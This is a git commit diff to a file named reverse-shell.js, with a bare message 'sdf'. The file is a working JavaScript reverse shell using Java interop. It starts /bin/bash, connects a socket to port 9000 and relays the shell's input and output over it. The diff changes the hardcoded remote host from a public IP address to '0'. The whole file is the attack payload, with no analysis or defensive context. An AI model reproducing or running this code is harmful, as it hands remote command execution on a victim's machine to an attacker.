04d9461f601e6175dc022ceb9335b544f5ebffde
Ariel <arielitati12@gmail.com>
2024-02-13 19:18:41 -0300

    sdf

--- reverse-shell.js
+++ reverse-shell.js
@@ -1,4 +1,4 @@
-var host="181.93.226.94";
+var host="0";
 var port=9000;
 var cmd="/bin/bash";
 var p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
